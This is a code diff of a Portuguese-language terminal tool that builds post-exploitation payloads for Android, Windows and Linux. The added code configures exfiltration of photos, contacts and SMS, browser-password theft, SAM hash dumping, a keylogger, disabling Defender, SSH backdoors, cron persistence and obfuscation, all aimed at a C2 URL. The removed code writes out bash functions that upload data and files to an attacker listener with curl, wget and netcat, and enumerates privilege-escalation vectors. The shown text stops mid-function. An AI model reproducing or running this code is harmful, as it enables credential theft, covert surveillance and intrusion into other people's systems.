@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/data/data/com.termux/files/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 import os
@@ -7,804 +7,840 @@ import time
 import random
 import base64
 import hashlib
+import json
+import uuid
 from typing import Dict, List, Optional
+
+# Interface colorida no terminal
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.prompt import Prompt, Confirm, IntPrompt
-from rich.progress import Progress
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
 from rich.text import Text
 from rich.syntax import Syntax
-import pygments
-from pygments.lexers import BashLexer
-from pygments.formatters import TerminalFormatter
+from rich.layout import Layout
+from rich.align import Align
 
 console = Console()
 
-class PostExploitGen:
+class PostExploitationGenerator:
     def __init__(self):
-        self.modules = {
-            'system_info': {
-                'function': self.gen_system_info,
-                'description': 'Coleta informações detalhadas do sistema',
-                'os': ['linux', 'windows']
+        self.c2_server = "https://your-c2-server.com/exfil"
+        self.encryption_key = str(uuid.uuid4()).replace('-', '')[:16]
+        
+        self.payloads = {
+            'android': {
+                'function': self.gerar_payload_android,
+                'description': 'Payload Android com coleta de dados',
+                'icon': '📱',
+                'modules': {
+                    'data_collection': 'Coleta de dados sensíveis',
+                    'persistence': 'Mecanismos de persistência',
+                    'privilege_escalation': 'Escalação de privilégios',
+                    'lateral_movement': 'Movimento lateral'
+                }
             },
-            'priv_esc': {
-                'function': self.gen_priv_esc,
-                'description': 'Técnicas de escalação de privilégio',
-                'os': ['linux', 'windows']
+            'windows': {
+                'function': self.gerar_payload_windows,
+                'description': 'Payload Windows com técnicas avançadas',
+                'icon': '🪟',
+                'modules': {
+                    'credential_harvesting': 'Coleta de credenciais',
+                    'persistence': 'Persistência no sistema',
+                    'defense_evasion': 'Evasão de defesas',
+                    'lateral_movement': 'Movimento lateral'
+                }
             },
-            'network_scan': {
-                'function': self.gen_network_scan,
-                'description': 'Varredura de rede e portas',
-                'os': ['linux', 'windows']
-            },
-            'screenshot': {
-                'function': self.gen_screenshot,
-                'description': 'Captura de tela (GUI apenas)',
-                'os': ['linux', 'windows']
-            },
-            'history': {
-                'function': self.gen_history,
-                'description': 'Coleta histórico de comandos',
-                'os': ['linux', 'windows']
-            },
-            'clean_tracks': {
-                'function': self.gen_clean_tracks,
-                'description': 'Limpeza de logs e rastros',
-                'os': ['linux', 'windows']
+            'linux': {
+                'function': self.gerar_payload_linux,
+                'description': 'Payload Linux para servidores',
+                'icon': '🐧',
+                'modules': {
+                    'privilege_escalation': 'Escalação de privilégios',
+                    'persistence': 'Mecanismos de persistência',
+                    'network_recon': 'Reconhecimento de rede',
+                    'backdoor': 'Backdoor persistente'
+                }
             }
         }
         
-        self.c2_options = {
-            'metasploit': {
-                'config': self.config_metasploit,
-                'description': 'Conexão com Metasploit Framework'
-            },
-            'netcat': {
-                'config': self.config_netcat,
-                'description': 'Conexão via Netcat'
-            },
-            'http': {
-                'config': self.config_http,
-                'description': 'Servidor HTTP personalizado'
-            }
+        self.techniques = {
+            'obfuscation': 'Ofuscação de código',
+            'encryption': 'Criptografia de dados',
+            'anti_debug': 'Anti-debugging',
+            'sandbox_evasion': 'Evasão de sandbox',
+            'persistence': 'Mecanismos de persistência'
         }
         
         self.banners = [
-            self._generate_banner_1(),
-            self._generate_banner_2(),
-            self._generate_banner_3()
+            self._gerar_banner_ghost(),
+            self._gerar_banner_phantom(),
+            self._gerar_banner_stealth()
         ]
-        
-        self.current_config = {
-            'os': None,
-            'c2_type': None,
-            'c2_params': {},
-            'modules': []
-        }
-
-    def _generate_banner_1(self) -> str:
+    
+    def _gerar_banner_ghost(self) -> str:
         return """
-  _____ _____ _____ _____ _____ _____ _____ 
- |_____|_____|_____|_____|_____|_____|_____|
- |  _  |  _  |  _  |  _  |  _  |  _  |  _  |
- | |_| | |_| | |_| | |_| | |_| | |_| | |_| |
- |_____|_____|_____|_____|_____|_____|_____|
- |_____ _____ _____ _____ _____ _____ _____|
- |  _  |  _  |  _  |  _  |  _  |  _  |  _  |
- | |_| | |_| | |_| | |_| | |_| | |_| | |_| |
- |_____|_____|_____|_____|_____|_____|_____|
-[bold red]       POST-EXPLOITATION FRAMEWORK v2.0[/bold red]
+[bold blue]
+ ██████  ██   ██ ███████  ██████ ████████ 
+██       ██   ██ ██      ██         ██    
+██   ███ ███████ █████   ██         ██    
+██    ██ ██   ██ ██      ██         ██    
+ ██████  ██   ██ ███████  ██████    ██    
+                                          
+███████ ███████ ████████ ██   ██ ██ ████████ 
+██      ██         ██    ██   ██ ██    ██    
+███████ █████      ██    ███████ ██    ██    
+     ██ ██         ██    ██   ██ ██    ██    
+███████ ███████    ██    ██   ██ ██    ██    
+[/bold blue]
+[bold white on blue]        GHOST EXPLOIT - POST EXPLOITATION FRAMEWORK[/bold white on blue]
 """
-
-    def _generate_banner_2(self) -> str:
+    
+    def _gerar_banner_phantom(self) -> str:
         return """
-  ____  ____  ____  ____  ____  ____  ____ 
- ||P ||||O ||||S ||||T ||||E ||||X ||||P ||
- ||__||||__||||__||||__||||__||||__||||__||
- |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
-  ____  ____  ____  ____  ____  ____  ____ 
- ||L ||||O ||||I ||||T ||||A ||||T ||||I ||
- ||__||||__||||__||||__||||__||||__||||__||
- |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
-[bold yellow]       ADVANCED POST-EXPLOITATION TOOL[/bold yellow]
+[bold green]
+██████  ██   ██  █████  ███    ██ ████████ ██████  ███    ███ 
+██   ██ ██   ██ ██   ██ ████   ██    ██    ██   ██ ████  ████ 
+██████  ███████ ███████ ██ ██  ██    ██    ██████  ██ ████ ██ 
+██      ██   ██ ██   ██ ██  ██ ██    ██    ██   ██ ██  ██  ██ 
+██      ██   ██ ██   ██ ██   ████    ██    ██   ██ ██      ██ 
+[/bold green]
+[bold black on green]        PHANTOM POST-EXPLOITATION TOOLKIT[/bold black on green]
 """
-
-    def _generate_banner_3(self) -> str:
+    
+    def _gerar_banner_stealth(self) -> str:
         return """
-  _______ _______ _______ _______ _______ 
- |   |   |   |   |   |   |   |   |   |   |
- |   |   |   |   |   |   |   |   |   |   |
- |___|___|___|___|___|___|___|___|___|___|
-  _______ _______ _______ _______ _______ 
- |   |   |   |   |   |   |   |   |   |   |
- |   |   |   |   |   |   |   |   |   |   |
- |___|___|___|___|___|___|___|___|___|___|
-[bold blue]       POST-EXPLOIT GENERATOR v3.1[/bold blue]
+[bold magenta]
+███████ ████████ ███████  █████  ██   ██ ████████ 
+██         ██    ██      ██   ██ ██  ██     ██    
+███████    ██    █████   ███████ █████      ██    
+     ██    ██    ██      ██   ██ ██  ██     ██    
+███████    ██    ███████ ██   ██ ██   ██    ██    
+[/bold magenta]
+[bold white on magenta]        STEALTH POST-EXPLOITATION FRAMEWORK[/bold white on magenta]
 """
-
-    def show_banner(self):
+    
+    def mostrar_banner(self):
         console.print(random.choice(self.banners))
         console.print(Panel.fit(
-            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! USE APENAS PARA TESTES AUTORIZADOS ⚠️[/blink bold red]",
+            "[blink bold red]⚠️ USE APENAS EM AMBIENTES AUTORIZADOS! ⚠️[/blink bold red]",
             style="red on black"
         ))
         time.sleep(1)
-
-    def main_menu(self):
+    
+    def mostrar_menu_principal(self):
         while True:
             console.clear()
-            self.show_banner()
+            self.mostrar_banner()
             
-            table = Table(title="[bold cyan]MAIN MENU[/bold cyan]", show_header=True, header_style="bold magenta")
-            table.add_column("Option", style="cyan", width=10)
-            table.add_column("Description", style="green")
+            tabela = Table(
+                title="[bold cyan]🎯 PLATAFORMAS DE PÓS-EXPLORAÇÃO[/bold cyan]",
+                show_header=True,
+                header_style="bold magenta"
+            )
+            tabela.add_column("Opção", style="cyan", width=10)
+            tabela.add_column("Plataforma", style="green")
+            tabela.add_column("Descrição", style="yellow")
+            tabela.add_column("Módulos", style="blue")
             
-            table.add_row("1", "Set target OS")
-            table.add_row("2", "Configure C2")
-            table.add_row("3", "Select modules")
-            table.add_row("4", "Generate script")
-            table.add_row("5", "Show config")
-            table.add_row("0", "Exit")
+            for i, (platform, data) in enumerate(self.payloads.items(), 1):
+                modulos = ", ".join(list(data['modules'].keys())[:2]) + "..."
+                tabela.add_row(str(i), f"{data['icon']} {platform.upper()}", data['description'], modulos)
             
-            console.print(table)
+            tabela.add_row("0", "⚙️", "Configurações", "")
+            tabela.add_row("9", "🚪", "Sair", "")
             
-            choice = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Select an option",
-                choices=["0", "1", "2", "3", "4", "5"],
+            console.print(tabela)
+            
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione a plataforma alvo",
+                choices=[str(i) for i in range(0, 10)] + ['9'],
                 show_choices=False
             )
             
-            if choice == "1":
-                self.config_target_os()
-            elif choice == "2":
-                self.config_c2_menu()
-            elif choice == "3":
-                self.select_modules_menu()
-            elif choice == "4":
-                self.generate_script()
-            elif choice == "5":
-                self.show_config()
-            elif choice == "0":
-                self.exit_tool()
-
-    def config_target_os(self):
-        console.clear()
-        console.print(Panel.fit("[bold]TARGET OS CONFIGURATION[/bold]", border_style="blue"))
-        
-        table = Table(show_header=False)
-        table.add_row("1", "Linux")
-        table.add_row("2", "Windows")
-        table.add_row("0", "Back")
-        console.print(table)
-        
-        choice = Prompt.ask(
-            "[blink yellow]➤[/blink yellow] Select target OS",
-            choices=["0", "1", "2"],
-            show_choices=False
-        )
-        
-        if choice == "1":
-            self.current_config['os'] = 'linux'
-            console.print("[green]✓ Target OS set to Linux[/green]")
-        elif choice == "2":
-            self.current_config['os'] = 'windows'
-            console.print("[green]✓ Target OS set to Windows[/green]")
-        
-        time.sleep(1)
-
-    def config_c2_menu(self):
-        while True:
-            console.clear()
-            console.print(Panel.fit("[bold]COMMAND & CONTROL CONFIG[/bold]", border_style="blue"))
-            
-            table = Table(title="C2 Options", show_header=True, header_style="bold magenta")
-            table.add_column("ID", style="cyan", width=5)
-            table.add_column("Type", style="green")
-            table.add_column("Description")
-            
-            for i, (name, data) in enumerate(self.c2_options.items(), 1):
-                table.add_row(str(i), name, data['description'])
-            
-            table.add_row("0", "Back", "Return to main menu")
-            console.print(table)
-            
-            choice = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Select C2 type",
-                choices=[str(i) for i in range(0, len(self.c2_options)+1)],
-                show_choices=False
-            )
-            
-            if choice == "0":
-                return
-            
-            c2_type = list(self.c2_options.keys())[int(choice)-1]
-            self.current_config['c2_type'] = c2_type
-            self.c2_options[c2_type]['config']()
-            break
-
-    def config_metasploit(self):
-        console.print("\n[bold]Metasploit Configuration[/bold]")
-        self.current_config['c2_params'] = {
-            'lhost': Prompt.ask("[yellow]?[/yellow] Listener IP", default="192.168.1.100"),
-            'lport': IntPrompt.ask("[yellow]?[/yellow] Listener port", default=4444),
-            'payload': Prompt.ask(
-                "[yellow]?[/yellow] Payload type", 
-                default="meterpreter/reverse_tcp",
-                choices=[
-                    "meterpreter/reverse_tcp",
-                    "meterpreter/reverse_http",
-                    "meterpreter/reverse_https",
-                    "shell/reverse_tcp"
-                ]
-            )
-        }
-        console.print("[green]✓ Metasploit config saved[/green]")
-        time.sleep(1)
-
-    def config_netcat(self):
-        console.print("\n[bold]Netcat Configuration[/bold]")
-        self.current_config['c2_params'] = {
-            'lhost': Prompt.ask("[yellow]?[/yellow] Connect back IP", default="192.168.1.100"),
-            'lport': IntPrompt.ask("[yellow]?[/yellow] Connect back port", default=4444),
-            'protocol': Prompt.ask(
-                "[yellow]?[/yellow] Protocol", 
-                default="tcp",
-                choices=["tcp", "udp"]
-            )
-        }
-        console.print("[green]✓ Netcat config saved[/green]")
-        time.sleep(1)
-
-    def config_http(self):
-        console.print("\n[bold]HTTP Server Configuration[/bold]")
-        self.current_config['c2_params'] = {
-            'url': Prompt.ask("[yellow]?[/yellow] Server URL (ex: http://192.168.1.100:8080)"),
-            'auth_key': Prompt.ask("[yellow]?[/yellow] Authentication key (optional)", default=""),
-            'encryption': Confirm.ask("[yellow]?[/yellow] Use encryption?", default=True)
-        }
-        console.print("[green]✓ HTTP config saved[/green]")
-        time.sleep(1)
-
-    def select_modules_menu(self):
-        if not self.current_config['os']:
-            console.print("[red]✗ First set target OS[/red]")
-            time.sleep(1)
-            return
+            if escolha == "1":
+                self._mostrar_submenu('android')
+            elif escolha == "2":
+                self._mostrar_submenu('windows')
+            elif escolha == "3":
+                self._mostrar_submenu('linux')
+            elif escolha == "0":
+                self._mostrar_menu_configuracao()
+            elif escolha == "9":
+                self._sair()
+    
+    def _mostrar_submenu(self, plataforma: str):
+        plataforma_data = self.payloads[plataforma]
         
         while True:
             console.clear()
-            console.print(Panel.fit("[bold]SELECT MODULES[/bold]", border_style="blue"))
+            console.print(Panel.fit(
+                f"[bold]{plataforma_data['icon']} PÓS-EXPLORAÇÃO {plataforma.upper()}[/bold]",
+                border_style="cyan"
+            ))
             
-            available_modules = {k: v for k, v in self.modules.items() 
-                               if self.current_config['os'] in v['os']}
+            tabela = Table(title="Módulos Disponíveis", show_header=True, header_style="bold green")
+            tabela.add_column("ID", style="cyan", width=5)
+            tabela.add_column("Módulo", style="green")
+            tabela.add_column("Descrição", style="yellow")
             
-            table = Table(title="Available Modules", show_header=True, header_style="bold magenta")
-            table.add_column("ID", style="cyan", width=5)
-            table.add_column("Module", style="green")
-            table.add_column("Description")
-            table.add_column("Selected", style="yellow")
+            for i, (modulo_id, descricao) in enumerate(plataforma_data['modules'].items(), 1):
+                tabela.add_row(str(i), modulo_id, descricao)
             
-            for i, (name, data) in enumerate(available_modules.items(), 1):
-                selected = "✓" if name in self.current_config['modules'] else "✗"
-                table.add_row(str(i), name, data['description'], selected)
+            tabela.add_row("A", "TODOS", "Todos os módulos")
+            tabela.add_row("0", "VOLTAR", "Retornar ao menu principal")
             
-            table.add_row("0", "Back", "Return to main menu", "")
-            console.print(table)
+            console.print(tabela)
             
-            choice = Prompt.ask(
-                "[blink yellow]➤[/blink yellow] Select modules (comma separated or 'all')",
-                default="0"
+            escolha = Prompt.ask(
+                "[blink yellow]➤[/blink yellow] Selecione os módulos (separados por vírgula)",
+                default="1"
             )
             
-            if choice == "0":
+            if escolha.upper() == "0":
                 return
-            elif choice.lower() == "all":
-                self.current_config['modules'] = list(available_modules.keys())
-                console.print("[green]✓ All modules selected[/green]")
+            elif escolha.upper() == "A":
+                modulos_selecionados = list(plataforma_data['modules'].keys())
             else:
-                selected = []
-                for num in choice.split(','):
+                modulos_selecionados = []
+                for item in escolha.split(','):
                     try:
-                        module_name = list(available_modules.keys())[int(num)-1]
-                        selected.append(module_name)
-                    except (ValueError, IndexError):
+                        idx = int(item.strip()) - 1
+                        if 0 <= idx < len(plataforma_data['modules']):
+                            modulos_selecionados.append(list(plataforma_data['modules'].keys())[idx])
+                    except:
                         pass
-                
-                self.current_config['modules'] = selected
-                console.print(f"[green]✓ {len(selected)} module(s) selected[/green]")
             
-            time.sleep(1)
-
-    def show_config(self):
+            if modulos_selecionados:
+                self._configurar_payload(plataforma, modulos_selecionados)
+    
+    def _configurar_payload(self, plataforma: str, modulos: List[str]):
         console.clear()
-        console.print(Panel.fit("[bold]CURRENT CONFIGURATION[/bold]", border_style="blue"))
+        console.print(Panel.fit(
+            f"[bold]⚙️ Configurando Payload {plataforma.upper()}[/bold]",
+            border_style="yellow"
+        ))
         
-        table = Table(show_header=False)
-        table.add_row("Target OS:", f"[cyan]{self.current_config['os'] or 'Not set'}[/cyan]")
+        config = {
+            'c2_server': self.c2_server,
+            'encryption_key': self.encryption_key,
+            'modulos': modulos
+        }
         
-        if self.current_config['c2_type']:
-            table.add_row("C2 Type:", f"[cyan]{self.current_config['c2_type']}[/cyan]")
-            for k, v in self.current_config['c2_params'].items():
-                table.add_row(f"  {k}:", f"[green]{v}[/green]")
-        else:
-            table.add_row("C2:", "[red]Not configured[/red]")
+        # Configurações específicas por plataforma
+        if plataforma == 'android':
+            config['exfiltrate_photos'] = Confirm.ask("Exfiltrar fotos?")
+            config['exfiltrate_contacts'] = Confirm.ask("Exfiltrar contatos?")
+            config['exfiltrate_sms'] = Confirm.ask("Exfiltrar SMS?")
+            config['get_root'] = Confirm.ask("Tentar obter root?")
+            
+        elif plataforma == 'windows':
+            config['steal_browser_passwords'] = Confirm.ask("Roubar senhas do navegador?")
+            config['dump_hashes'] = Confirm.ask("Dump de hashes SAM?")
+            config['keylogger'] = Confirm.ask("Ativar keylogger?")
+            config['disable_defender'] = Confirm.ask("Tentar desativar Defender?")
+            
+        elif plataforma == 'linux':
+            config['ssh_backdoor'] = Confirm.ask("Criar backdoor SSH?")
+            config['cron_persistence'] = Confirm.ask("Adicionar persistência via cron?")
+            config['ssh_keys'] = Confirm.ask("Coletar chaves SSH?")
+            config['network_scan'] = Confirm.ask("Executar scan de rede?")
         
-        if self.current_config['modules']:
-            table.add_row("Modules:", "\n".join(
-                f"[yellow]• {m}[/yellow]" for m in self.current_config['modules'])
-            )
-        else:
-            table.add_row("Modules:", "[red]No modules selected[/red]")
+        # Técnicas avançadas
+        console.print("\n[bold]🛡️ Técnicas Avançadas:[/bold]")
+        tecnicas_disponiveis = list(self.techniques.keys())
+        for i, tecnica in enumerate(tecnicas_disponiveis, 1):
+            console.print(f"{i}. {self.techniques[tecnica]}")
         
-        console.print(table)
-        input("\nPress Enter to continue...")
-
-    def generate_script(self):
-        if not all([self.current_config['os'], self.current_config['c2_type'], self.current_config['modules']]):
-            console.print("[red]✗ Incomplete config! Set OS, C2 and modules[/red]")
-            time.sleep(2)
-            return
-        
-        console.clear()
-        console.print(Panel.fit("[bold]GENERATE SCRIPT[/bold]", border_style="blue"))
-        
-        filename = Prompt.ask(
-            "[yellow]?[/yellow] Output filename",
-            default=f"post_exploit_{self.current_config['os']}.sh"
+        tecnicas_escolha = Prompt.ask(
+            "Selecione técnicas (separadas por vírgula)",
+            default=",".join([str(i) for i in range(1, len(tecnicas_disponiveis)+1)])
         )
         
+        config['advanced_techniques'] = []
+        for item in tecnicas_escolha.split(','):
+            try:
+                idx = int(item.strip()) - 1
+                if 0 <= idx < len(tecnicas_disponiveis):
+                    config['advanced_techniques'].append(tecnicas_disponiveis[idx])
+            except:
+                pass
+        
+        if Confirm.ask("Gerar payload?"):
+            self._gerar_e_salvar_payload(plataforma, config)
+    
+    def _gerar_e_salvar_payload(self, plataforma: str, config: Dict):
         with Progress() as progress:
-            task = progress.add_task("[cyan]Generating script...[/cyan]", total=100)
+            task = progress.add_task("[red]Gerando payload...[/red]", total=100)
             
-            # Generate header
-            script = self._generate_script_header()
-            progress.update(task, advance=10)
+            # Gerar payload base
+            payload_function = self.payloads[plataforma]['function']
+            payload = payload_function(config)
+            progress.update(task, advance=30)
             
-            # Generate C2 functions
-            c2_func = getattr(self, f"gen_c2_{self.current_config['c2_type']}")
-            script += c2_func()
+            # Aplicar técnicas avançadas
+            for tecnica in config['advanced_techniques']:
+                payload = self._aplicar_tecnica_avancada(payload, tecnica)
+                progress.update(task, advance=10)
+            
+            # Ofuscar código
+            payload = self._ofuscar_codigo(payload, plataforma)
             progress.update(task, advance=20)
             
-            # Generate selected modules
-            for module in self.current_config['modules']:
-                script += self.modules[module]['function']()
-                progress.update(task, advance=70/len(self.current_config['modules']))
-            
-            # Generate footer and main
-            script += self._generate_script_footer()
             progress.update(task, completed=100)
         
-        # Save file
-        try:
-            with open(filename, 'w') as f:
-                f.write(script)
-            
-            # Calculate hashes
-            with open(filename, 'rb') as f:
-                md5 = hashlib.md5(f.read()).hexdigest()
-                sha256 = hashlib.sha256(f.read()).hexdigest()
-            
-            # Show preview
-            console.print("\n[bold]Preview:[/bold]")
-            console.print(Syntax(script[:500], "bash", line_numbers=True))
-            console.print(f"[yellow]... (truncated for preview)[/yellow]")
-            
-            # Show info
-            console.print(Panel.fit(
-                f"[green]✓ Script generated successfully![/green]\n"
-                f"Filename: [bold]{filename}[/bold]\n"
-                f"Size: [bold]{len(script)}[/bold] bytes\n"
-                f"MD5: [bold]{md5}[/bold]\n"
-                f"SHA256: [bold]{sha256}[/bold]",
-                title="[bold green]SUCCESS[/bold green]",
-                border_style="green"
-            ))
-            
-            console.print("\n[bold]Instructions:[/bold]")
-            if self.current_config['os'] == 'linux':
-                console.print(f"[cyan]chmod +x {filename} && ./{filename}[/cyan]")
-            else:
-                console.print(f"[cyan]Can be executed as bash script on Windows (requires Git Bash/WSL)[/cyan]")
-            
-        except Exception as e:
-            console.print(Panel.fit(
-                f"[red]✗ Error generating script: {str(e)}[/red]",
-                title="[bold red]ERROR[/bold red]",
-                border_style="red"
-            ))
+        # Mostrar preview
+        self._preview_payload(payload, plataforma)
         
-        input("\nPress Enter to continue...")
-
-    def _generate_script_header(self) -> str:
-        banner = r"""
-==================================================
-=                POST-EXPLOITATION               =
-=                  FRAMEWORK v2.0                =
-==================================================
-=    Automated Post-Exploitation Script          =
-=    Generated on: {time}    =
-==================================================
-""".format(time=time.strftime("%Y-%m-%d %H:%M:%S"))
+        # Salvar payload
+        nome_arquivo = f"post_exploit_{plataforma}_{int(time.time())}"
+        if plataforma == 'windows':
+            nome_arquivo += '.ps1'
+        else:
+            nome_arquivo += '.sh'
         
-        header = f"""#!/bin/bash
-{banner}
-
-# Configuration
-OS="{self.current_config['os']}"
-C2_TYPE="{self.current_config['c2_type']}"
-
-# Colors
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-NC='\033[0m'
-
-# Logging
-LOG_FILE="/tmp/post_exploit.log"
-echo "=== Post-Exploitation Script Started ===" > $LOG_FILE
-date >> $LOG_FILE
-
-function log() {{
-    echo -e "${{YELLOW}}[$(date '+%H:%M:%S')] $1${{NC}}"
-    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
-}}
-
-function send_data() {{
-    # Function to send data to C2
-    local data="$1"
-    log "Sending data to C2: $data"
-    
-"""
-        return header
-
-    def gen_c2_metasploit(self) -> str:
-        params = self.current_config['c2_params']
-        return f"""
-    # Metasploit C2 communication
-    MSF_IP="{params['lhost']}"
-    MSF_PORT="{params['lport']}"
-    PAYLOAD="{params['payload']}"
-    
-    function msf_send() {{
-        local data="$1"
-        if command -v curl &>/dev/null; then
-            curl -s -X POST "http://$MSF_IP:$MSF_PORT/data" -d "$data"
-        elif command -v wget &>/dev/null; then
-            wget -q -O - "http://$MSF_IP:$MSF_PORT/data" --post-data="$data"
-        else
-            echo "No HTTP client found for C2 communication"
-        fi
-    }}
-    
-    function msf_upload() {{
-        local file="$1"
-        if [ ! -f "$file" ]; then
-            log "File not found: $file"
-            return
-        fi
+        with open(nome_arquivo, 'w', encoding='utf-8') as f:
+            f.write(payload)
         
-        if command -v curl &>/dev/null; then
-            curl -s -X POST "http://$MSF_IP:$MSF_PORT/upload" -F "file=@$file"
-        elif command -v wget &>/dev/null; then
-            wget -q -O - "http://$MSF_IP:$MSF_PORT/upload" --post-file="$file"
-        else
-            echo "No HTTP client found for file upload"
-        fi
-    }}
-"""
-
-    def gen_c2_netcat(self) -> str:
-        params = self.current_config['c2_params']
-        return f"""
-    # Netcat C2 communication
-    NC_IP="{params['lhost']}"
-    NC_PORT="{params['lport']}"
-    PROTOCOL="{params['protocol']}"
-    
-    function nc_send() {{
-        local data="$1"
-        if command -v nc &>/dev/null; then
-            echo "$data" | nc -w 3 ${{PROTOCOL:+-u}} "$NC_IP" "$NC_PORT"
-        else
-            echo "Netcat not found for C2 communication"
-        fi
-    }}
-    
-    function nc_upload() {{
-        local file="$1"
-        if [ ! -f "$file" ]; then
-            log "File not found: $file"
-            return
-        fi
+        os.chmod(nome_arquivo, 0o755)
         
-        if command -v nc &>/dev/null; then
-            base64 "$file" | nc -w 3 ${{PROTOCOL:+-u}} "$NC_IP" "$NC_PORT"
-        else
-            echo "Netcat not found for file upload"
-        fi
-    }}
-"""
-
-    def gen_c2_http(self) -> str:
-        params = self.current_config['c2_params']
-        return f"""
-    # HTTP C2 communication
-    HTTP_URL="{params['url']}"
-    AUTH_KEY="{params['auth_key']}"
-    USE_ENCRYPTION="{params['encryption']}"
-    
-    function http_send() {{
-        local data="$1"
-        if [ "$USE_ENCRYPTION" = "true" ]; then
-            data=$(echo "$data" | openssl enc -e -aes-256-cbc -salt -pass pass:"$AUTH_KEY" -base64 2>/dev/null)
-        fi
-        
-        if command -v curl &>/dev/null; then
-            curl -s -X POST "$HTTP_URL/data" -H "Authorization: $AUTH_KEY" -d "$data"
-        elif command -v wget &>/dev/null; then
-            wget -q -O - "$HTTP_URL/data" --header="Authorization: $AUTH_KEY" --post-data="$data"
-        else
-            echo "No HTTP client found for C2 communication"
-        fi
-    }}
-    
-    function http_upload() {{
-        local file="$1"
-        if [ ! -f "$file" ]; then
-            log "File not found: $file"
-            return
-        fi
-        
-        if [ "$USE_ENCRYPTION" = "true" ]; then
-            local enc_file="/tmp/$(basename "$file").enc"
-            openssl enc -e -aes-256-cbc -salt -pass pass:"$AUTH_KEY" -in "$file" -out "$enc_file"
-            file="$enc_file"
-        fi
-        
-        if command -v curl &>/dev/null; then
-            curl -s -X POST "$HTTP_URL/upload" -H "Authorization: $AUTH_KEY" -F "file=@$file"
-        elif command -v wget &>/dev/null; then
-            wget -q -O - "$HTTP_URL/upload" --header="Authorization: $AUTH_KEY" --post-file="$file"
-        else
-            echo "No HTTP client found for file upload"
-        fi
-        
-        [ "$USE_ENCRYPTION" = "true" ] && rm -f "$enc_file"
-    }}
-"""
-
-    def gen_system_info(self) -> str:
-        return """
-function collect_system_info() {
-    log "Collecting system information..."
-    
-    local info="=== SYSTEM INFORMATION ===\\n"
-    info+="Hostname: $(hostname)\\n"
-    info+="OS: $(uname -a)\\n"
-    info+="Kernel: $(uname -r)\\n"
-    
-    if [ "$OS" = "linux" ]; then
-        info+="\\n=== LINUX SPECIFIC ===\\n"
-        info+="Distro: $(cat /etc/*-release 2>/dev/null | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"')\\n"
-        info+="Users: $(cat /etc/passwd | cut -d: -f1 | tr '\\n' ' ')\\n"
-        info+="Sudoers: $(grep -v '^#' /etc/sudoers 2>/dev/null | grep -v '^$')\\n"
-    else
-        info+="\\n=== WINDOWS SPECIFIC ===\\n"
-        info+="OS Version: $(cmd.exe /c ver 2>/dev/null)\\n"
-        info+="Current User: $(whoami)\\n"
-        info+="Local Users: $(net user | grep -v 'The command completed')\\n"
-    fi
-    
-    info+="\\n=== NETWORK INFO ===\\n"
-    info+="IP Addresses: $(ip a 2>/dev/null || ifconfig 2>/dev/null)\\n"
-    info+="Routing Table: $(ip r 2>/dev/null || route print 2>/dev/null)\\n"
-    info+="ARP Table: $(ip n 2>/dev/null || arp -a 2>/dev/null)\\n"
-    
-    info+="\\n=== DISK INFO ===\\n"
-    info+="Disk Usage: $(df -h 2>/dev/null || wmic logicaldisk get size,freespace,caption 2>/dev/null)\\n"
-    info+="Mounted Filesystems: $(mount 2>/dev/null)\\n"
-    
-    send_data "$info"
-}
-"""
-
-    def gen_priv_esc(self) -> str:
-        return """
-function privilege_escalation() {
-    log "Attempting privilege escalation..."
-    
-    local result="=== PRIVILEGE ESCALATION ATTEMPTS ===\\n"
-    
-    if [ "$OS" = "linux" ]; then
-        # Common Linux privilege escalation vectors
-        result+="\\nSUID Files:\\n$(find / -perm -4000 -type f 2>/dev/null)\\n"
-        result+="\\nWritable Files:\\n$(find / -perm -o+w -type f 2>/dev/null | head -n 50)\\n"
-        result+="\\nCron Jobs:\\n$(crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null)\\n"
-        result+="\\nCapabilities:\\n$(getcap -r / 2>/dev/null)\\n"
-        
-        # Try known exploits
-        result+="\\nKernel Version:\\n$(uname -a)\\n"
-        result+="\\nPossible Exploits:\\n"
-        result+="DirtyCow: $(grep -i 'linux 3.' /proc/version 2>/dev/null && echo 'Possible' || echo 'Unlikely')\\n"
-        result+="Sudo Version: $(sudo -V 2>/dev/null | head -n1)\\n"
-    else
-        # Windows privilege escalation
-        result+="\\nUser Privileges:\\n$(whoami /priv 2>/dev/null)\\n"
-        result+="\\nInstalled Software:\\n$(wmic product get name,version 2>/dev/null)\\n"
-        result+="\\nServices:\\n$(net start 2>/dev/null)\\n"
-        result+="\\nScheduled Tasks:\\n$(schtasks /query /fo LIST 2>/dev/null)\\n"
-    fi
-    
-    # Try to get root/admin
-    if [ "$OS" = "linux" ]; then
-        if sudo -n true 2>/dev/null; then
-            result+="\\n[SUCCESS] User has passwordless sudo access!\\n"
-        elif [ -w /etc/sudoers ]; then
-            result+="\\n[SUCCESS] /etc/sudoers is writable!\\n"
-        else
-            result+="\\n[FAILURE] No obvious privilege escalation found\\n"
-        fi
-    else
-        if net localgroup administrators | grep -q "$(whoami)"; then
-            result+="\\n[SUCCESS] User is in Administrators group!\\n"
-        else
-            result+="\\n[FAILURE] Not in Administrators group\\n"
-        fi
-    fi
-    
-    send_data "$result"
-}
-"""
-
-    def gen_network_scan(self) -> str:
-        return """
-function network_scan() {
-    log "Performing network scan..."
-    
-    local result="=== NETWORK SCAN RESULTS ===\\n"
-    
-    if [ "$OS" = "linux" ]; then
-        # Linux network scanning
-        result+="\\nLocal Network:\\n$(ip route 2>/dev/null)\\n"
-        result+="\\nARP Table:\\n$(ip neigh 2>/dev/null || arp -a 2>/dev/null)\\n"
-        
-        if command -v nmap &>/dev/null; then
-            result+="\\nNmap Quick Scan:\\n$(nmap -sn $(ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' 2>/dev/null) 2>/dev/null)\\n"
-        elif command -v netdiscover &>/dev/null; then
